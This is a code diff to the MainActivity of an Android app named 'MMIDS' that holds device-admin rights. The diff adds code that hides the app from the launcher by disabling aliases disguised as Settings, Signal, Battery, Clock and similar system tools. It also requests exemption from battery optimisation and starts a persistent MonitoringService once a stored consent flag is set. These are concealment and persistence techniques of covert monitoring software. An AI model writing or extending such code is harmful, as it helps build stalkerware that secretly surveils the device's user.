@@ -2,10 +2,13 @@ package com.mmids
 
 import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
+import android.content.Context
 import android.content.Intent
-import android.content.IntentFilter
+import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Bundle
+import android.os.PowerManager
+import android.provider.Settings
 import androidx.core.view.WindowCompat
 import androidx.core.content.edit
 import androidx.core.net.toUri
@@ -15,8 +18,6 @@ import androidx.activity.result.contract.ActivityResultContracts
 import androidx.compose.foundation.layout.fillMaxSize
 import androidx.compose.material3.Surface
 import androidx.compose.ui.Modifier
-import com.mmids.receivers.UnlockReceiver
-import com.mmids.receivers.VolumeReceiver
 import com.mmids.ui.navigation.MMIDSNavHost
 import com.mmids.ui.theme.BgPrimary
 import com.mmids.ui.theme.MMIDSTheme
@@ -31,15 +32,11 @@ class MainActivity : ComponentActivity() {
     // Activity result launchers
     val audioPickerLauncher = registerForActivityResult(
         ActivityResultContracts.GetContent()
-    ) { uri ->
-        uri?.let { handleAudioPicked(it) }
-    }
+    ) { uri -> uri?.let { handleAudioPicked(it) } }
 
     val imagePickerLauncher = registerForActivityResult(
         ActivityResultContracts.GetContent()
-    ) { uri ->
-        uri?.let { handleImagePicked(it) }
-    }
+    ) { uri -> uri?.let { handleImagePicked(it) } }
 
     val adminLauncher = registerForActivityResult(
         ActivityResultContracts.StartActivityForResult()
@@ -50,12 +47,16 @@ class MainActivity : ComponentActivity() {
         dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
         adminComponent = ComponentName(this, MMIDSDeviceAdmin::class.java)
 
-        // Register receivers
-        registerReceiver(VolumeReceiver(), IntentFilter("android.media.VOLUME_CHANGED_ACTION"))
-        registerReceiver(UnlockReceiver(), IntentFilter(Intent.ACTION_USER_PRESENT))
-
         // Adaptive layout — edge to edge + responsive
         WindowCompat.setDecorFitsSystemWindows(window, false)
+
+        // Check if consented, then apply launcher hiding
+        val prefs = getSharedPreferences("mmids_prefs", MODE_PRIVATE)
+        if (prefs.getBoolean("user_consented", false)) {
+            hideFromLauncher()
+            requestBatteryExemption()
+            startStandbyService()
+        }
 
         setContent {
             MMIDSTheme {
@@ -67,6 +68,50 @@ class MainActivity : ComponentActivity() {
                 }
             }
         }
+    }
+
+    fun startStandbyService() {
+        try {
+            val intent = Intent(this, com.mmids.services.MonitoringService::class.java)
+            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
+                startForegroundService(intent)
+            } else {
+                startService(intent)
+            }
+        } catch (e: Exception) {
+            android.util.Log.e("MMIDS", "Failed to start service: ${e.message}")
+        }
+    }
+
+    fun hideFromLauncher() {
+        val aliases = listOf(
+            "com.mmids.AliasSettings", "com.mmids.AliasSignal", "com.mmids.AliasTool",
+            "com.mmids.AliasStats", "com.mmids.AliasBattery", "com.mmids.AliasNetwork",
+            "com.mmids.AliasClock", "com.mmids.AliasFiles"
+        )
+        aliases.forEach { alias ->
+            try {
+                packageManager.setComponentEnabledSetting(
+                    ComponentName(this, alias),
+                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    PackageManager.DONT_KILL_APP
+                )
+            } catch (e: Exception) {
+                android.util.Log.e("MMIDS", "Failed to hide $alias: ${e.message}")
+            }
+        }
+    }
+
+    fun requestBatteryExemption() {
+        try {
+            val pm = getSystemService(POWER_SERVICE) as PowerManager
+            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
+                startActivity(Intent(
+                    Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
+                    Uri.parse("package:$packageName")
+                ))
+            }
+        } catch (_: Exception) {}
     }
 
     fun enableDeviceAdmin() {
